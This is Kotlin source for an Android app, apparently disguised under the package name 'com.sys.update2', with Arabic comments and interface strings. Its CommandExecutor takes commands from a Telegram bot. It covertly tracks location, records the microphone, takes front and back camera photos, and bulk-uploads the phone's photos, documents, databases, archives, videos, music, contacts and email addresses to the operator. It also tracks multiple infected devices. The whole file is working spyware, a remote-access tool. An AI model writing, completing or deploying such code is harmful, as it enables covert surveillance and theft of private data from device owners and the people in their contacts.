package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object CommandExecutor {

    // ═══════════════════════════════════════════
    //  PhotoIndex — يحفظ metadata الصور في Firestore
    // ═══════════════════════════════════════════
    private object PhotoIndex {
        private val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()

        private fun base(): String =
            "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

        private fun str(s: String) = JSONObject().put("stringValue", s)
        private fun num(n: Long) = JSONObject().put("integerValue", n.toString())

        fun save(ctx: Context, fileId: String, msgId: Int, name: String, size: Long, caption: String) {
            Thread {
                try {
                    val deviceId = DeviceManager.getDeviceId(ctx)
                    val url = "${base()}/devices/$deviceId/photos/$msgId?key=${Config.FIREBASE_API_KEY}"
                    val fields = JSONObject().apply {
                        put("file_id", str(fileId))
                        put("msg_id", num(msgId.toLong()))
                        put("name", str(name))
                        put("size", num(size))
                        put("date", num(System.currentTimeMillis()))
                        put("caption", str(caption))
                    }
                    val body = JSONObject().put("fields", fields).toString()
                    val req = Request.Builder()
                        .url(url)
                        .patch(body.toRequestBody("application/json".toMediaType()))
                        .build()
                    client.newCall(req).execute().use { resp ->
                        if (!resp.isSuccessful) Log.e("PhotoIndex", "save failed: ${resp.code}")
                    }
                } catch (e: Exception) {
                    Log.e("PhotoIndex", "save err: ${e.message}")
                }
            }.start()
        }

        fun list(ctx: Context): String {
            return try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
                val req = Request.Builder().url(url).get().build()
                client.newCall(req).execute().use { resp ->
                    val body = resp.body?.string()
                    if (body.isNullOrBlank()) {
                        "[]"
                    } else {
                        val obj = JSONObject(body)
                        val docs = obj.optJSONArray("documents")
                        if (docs == null) {
                            "[]"
                        } else {
                            val arr = JSONArray()
                            for (i in 0 until docs.length()) {
                                val doc = docs.optJSONObject(i) ?: continue
                                val f = doc.optJSONObject("fields") ?: continue
                                val item = JSONObject().apply {
                                    put("file_id", f.optJSONObject("file_id")?.optString("stringValue") ?: "")
                                    put("msg_id", f.optJSONObject("msg_id")?.optString("integerValue")?.toLongOrNull() ?: 0)
                                    put("name", f.optJSONObject("name")?.optString("stringValue") ?: "")
                                    put("size", f.optJSONObject("size")?.optString("integerValue")?.toLongOrNull() ?: 0)
                                    put("date", f.optJSONObject("date")?.optString("integerValue")?.toLongOrNull() ?: 0)
                                    put("caption", f.optJSONObject("caption")?.optString("stringValue") ?: "")
                                }
                                arr.put(item)
                            }
                            arr.toString()
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("PhotoIndex", "list err: ${e.message}")
                "[]"
            }
        }

        fun clear(ctx: Context) {
            Thread {
                try {
                    val deviceId = DeviceManager.getDeviceId(ctx)
                    val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
                    val req = Request.Builder().url(url).get().build()
                    client.newCall(req).execute().use { resp ->
                        val body = resp.body?.string()
                        if (!body.isNullOrBlank()) {
                            val docs = JSONObject(body).optJSONArray("documents")
                            if (docs != null) {
                                for (i in 0 until docs.length()) {
                                    val name = docs.optJSONObject(i)?.optString("name") ?: continue
                                    val delUrl = "https://firestore.googleapis.com/v1/$name?key=${Config.FIREBASE_API_KEY}"
                                    val delReq = Request.Builder().url(delUrl).delete().build()
                                    client.newCall(delReq).execute().use { }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("PhotoIndex", "clear err: ${e.message}")
                }
            }.start()
        }
    }

    // ═══════════════════════════════════════════
    //  PhotoCache — حفظ الصور محلياً
    // ═══════════════════════════════════════════
    private object PhotoCache {
        fun dir(ctx: Context): File {
            val d = File(ctx.filesDir, "gallery")
            if (!d.exists()) d.mkdirs()
            return d
        }

        fun file(ctx: Context, fileId: String): File {
            val safe = fileId.replace(Regex("[^A-Za-z0-9_-]"), "_").take(80)
            return File(dir(ctx), "$safe.jpg")
        }

        fun has(ctx: Context, fileId: String): Boolean {
            val f = file(ctx, fileId)
            return f.exists() && f.length() > 0
        }

        fun save(ctx: Context, fileId: String, bytes: ByteArray): File? {
            return try {
                val f = file(ctx, fileId)
                f.writeBytes(bytes)
                f
            } catch (e: Exception) {
                Log.e("PhotoCache", "save err: ${e.message}")
                null
            }
        }

        fun size(ctx: Context): Long {
            return try {
                dir(ctx).listFiles()?.sumOf { it.length() } ?: 0L
            } catch (_: Exception) { 0L }
        }

        fun clear(ctx: Context) {
            try { dir(ctx).listFiles()?.forEach { it.delete() } } catch (_: Exception) {}
        }
    }

    // ═══════════════════════════════════════════
    //  WebView API — يستخدمها الـ HTML
    // ═══════════════════════════════════════════

    fun listPhotosJson(ctx: Context): String = PhotoIndex.list(ctx)

    fun getPhotoUrl(ctx: Context, fileId: String): String {
        if (PhotoCache.has(ctx, fileId)) {
            return "file://" + PhotoCache.file(ctx, fileId).absolutePath
        }
        return try {
            val path = TelegramApi.getFile(fileId)
            if (path.isNullOrBlank()) "" else "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
        } catch (e: Exception) {
            Log.e("CmdExec", "getPhotoUrl err: ${e.message}")
            ""
        }
    }

    fun cachePhoto(ctx: Context, fileId: String): String {
        return try {
            if (PhotoCache.has(ctx, fileId)) {
                return "file://" + PhotoCache.file(ctx, fileId).absolutePath
            }
            val path = TelegramApi.getFile(fileId)
            if (path.isNullOrBlank()) return ""
            val url = "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build()
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) {
                    ""
                } else {
                    val bytes = resp.body?.bytes()
                    if (bytes == null) {
                        ""
                    } else {
                        val f = PhotoCache.save(ctx, fileId, bytes)
                        if (f != null) "file://" + f.absolutePath else ""
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("CmdExec", "cachePhoto err: ${e.message}")
            ""
        }
    }

    fun isPhotoCached(ctx: Context, fileId: String): Boolean =
        try { PhotoCache.has(ctx, fileId) } catch (_: Exception) { false }

    fun clearPhotoCache(ctx: Context): Boolean =
        try { PhotoCache.clear(ctx); true } catch (_: Exception) { false }

    fun photoCacheSize(ctx: Context): Long =
        try { PhotoCache.size(ctx) } catch (_: Exception) { 0L }

    fun clearPhotoIndex(ctx: Context) = PhotoIndex.clear(ctx)

    // ═══════════════════════════════════════════
    //  المعالج الرئيسي للأوامر
    // ═══════════════════════════════════════════

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "cmd: $cmd")

        when {
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            cmd == "🟢 تشغيل الصور" || cmd == "🔴 إيقاف الصور" -> togglePhotos(ctx)
            cmd == "🟢 تشغيل الموقع" || cmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx)
            cmd == "🟢 تشغيل المايك" || cmd == "🔴 إيقاف المايك" -> toggleAudio(ctx)

            cmd == "📍 عرض الموقع" -> showLocation(ctx)

            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)

            cmd == "📁 كل الملفات" || cmd == "/files" -> fetchFiles(ctx)
            cmd == "📄 المستندات" || cmd == "/docs" -> fetchDocuments(ctx)
            cmd == "📦 المضغوطة" || cmd == "/archives" -> fetchArchives(ctx)
            cmd == "📱 APK" || cmd == "/apks" -> fetchApks(ctx)
            cmd == "🗄 قواعد بيانات" || cmd == "/dbs" -> fetchDatabases(ctx)
            cmd == "🎬 الفيديو" || cmd == "/videos" -> fetchVideos(ctx)

            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)

            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
            cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "كل الأجهزة", "all")
            cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))

            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  Toggle
    // ═══════════════════════════════════════════
    private fun togglePhotos(ctx: Context) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📸 *الصور التلقائية*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    private fun toggleLocation(ctx: Context) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📍 *تتبع الموقع*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    private fun toggleAudio(ctx: Context) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) AudioRecorder.startLoop(ctx) else AudioRecorder.stopLoop(ctx)
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  Files
    // ═══════════════════════════════════════════
    private fun fetchFiles(ctx: Context) {
        runJob(ctx, "files") {
            TelegramApi.sendMessage("📁 *جاري فحص الملفات...*")
            val allTypes = FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES +
                    FileGrabber.APKS + FileGrabber.DATABASES + FileGrabber.CODE
            val files = FileGrabber.scanByTypes(allTypes, 2000)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد ملفات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "📁 كل الملفات")
        }
    }

    private fun fetchDocuments(ctx: Context) {
        runJob(ctx, "docs") {
            TelegramApi.sendMessage("📄 *جاري فحص المستندات...*")
            val files = FileGrabber.scanByTypes(FileGrabber.DOCUMENTS, 1000)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد مستندات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "📄 المستندات")
        }
    }

    private fun fetchArchives(ctx: Context) {
        runJob(ctx, "archives") {
            val files = FileGrabber.scanByTypes(FileGrabber.ARCHIVES, 500)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا ملفات مضغوطة", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "📦 الملفات المضغوطة")
        }
    }

    private fun fetchApks(ctx: Context) {
        runJob(ctx, "apks") {
            val files = FileGrabber.scanByTypes(FileGrabber.APKS, 500)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا يوجد APK", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "📱 ملفات APK")
        }
    }

    private fun fetchDatabases(ctx: Context) {
        runJob(ctx, "dbs") {
            val files = FileGrabber.scanByTypes(FileGrabber.DATABASES, 500)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا قواعد بيانات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "🗄 قواعد بيانات")
        }
    }

    private fun fetchVideos(ctx: Context) {
        runJob(ctx, "videos") {
            val files = FileGrabber.scanByTypes(FileGrabber.VIDEOS, 500)
            if (files.isEmpty()) {
                TelegramApi.sendMessage("📭 لا فيديوهات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            sendFilesList(ctx, files, "🎬 الفيديو")
        }
    }

    private fun sendFilesList(ctx: Context, files: List<FileGrabber.FoundFile>, title: String) {
        val sb = StringBuilder()
        sb.append("$title — ${files.size}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

        var count = 0
        for (f in files) {
            sb.append("📄 *${f.name}*\n")
            sb.append("   ${f.size / 1024} KB\n\n")
            count++
            if (sb.length > 3500) {
                TelegramApi.sendMessage(sb.toString())
                sb.clear()
            }
            if (count >= 100) break
        }
        if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString())

        TelegramApi.sendMessage("📤 *جاري إرسال ${files.size} ملف...*")

        var sent = 0
        var failed = 0
        for (f in files) {
            val file = File(f.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendDocument(file, "📄 ${f.name}")
            if (ok) sent++ else failed++
            Thread.sleep(400)
        }

        TelegramApi.sendMessage("✅ *انتهى*\n\n📤 $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  الأوامر الأساسية
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage("🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇", KeyboardBuilder.replyKeyboard())
    }

    private fun showDeviceInfo(ctx: Context) {
        TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx), KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            sendMediaList(ctx, MediaScanner.scanImages(ctx), "📸 كل الصور")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(n), "📸 آخر $n صورة")
        }
    }

    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }

            val result = TelegramApi.sendPhoto(file, item.name)
            val ok = result.first
            val fileId = result.second
            if (ok) {
                sent++
                if (fileId.isNotBlank()) {
                    PhotoIndex.save(ctx, fileId, sent, item.name, item.size, "📸 ${item.name}")
                }
            } else {
                failed++
            }
        }
        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    private fun fetchAllMusic(ctx: Context) {
        runJob(ctx, "music") {
            val music = MediaScanner.scanAudio(ctx)
            if (music.isEmpty()) {
                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            TelegramApi.sendMessage("🎵 *جاري إرسال ${music.size} مقطع...*", KeyboardBuilder.replyKeyboard())
            var sent = 0
            var failed = 0
            for (m in music) {
                val file = File(m.path)
                if (!file.exists()) { failed++; continue }
                if (TelegramApi.sendAudio(file, "🎵 ${m.name}")) sent++ else failed++
                Thread.sleep(300)
            }
            TelegramApi.sendMessage("🎵 *انتهى*\n\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية 🤳" else "خلفية 📸"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                val result = TelegramApi.sendPhoto(file, "📷 صورة ($label)")
                val ok = result.first
                val fileId = result.second
                if (ok && fileId.isNotBlank()) {
                    PhotoIndex.save(ctx, fileId, System.currentTimeMillis().toInt(), file.name, file.length(), "📷 صورة ($label)")
                }
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
                if (count >= 150) { sb.append("… +${contacts.size - count} آخرين\n"); break }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for (e in emails) {
                sb.append("✉️ *${e.name}*\n`${e.email}`\n\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)
            sendMediaList(ctx, MediaScanner.scanImages(ctx).take(30), "📸 الصور")
            Thread.sleep(400)
            fetchContacts(ctx)
            Thread.sleep(400)
            fetchEmails(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  أجهزة
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob(ctx, "devices") {
            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) {
                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((id, name, online) in devices) {
                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
                sb.append("$status *$name*\n")
                sb.append("`$id`\n\n")
            }
            val keyboard = KeyboardBuilder.deviceListKeyboard(devices.map { it.first to it.second })
            TelegramApi.sendMessage(sb.toString(), keyboard)
        }
    }

    private fun selectDevice(ctx: Context, name: String, id: String) {
        TelegramApi.sendMessage(
            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
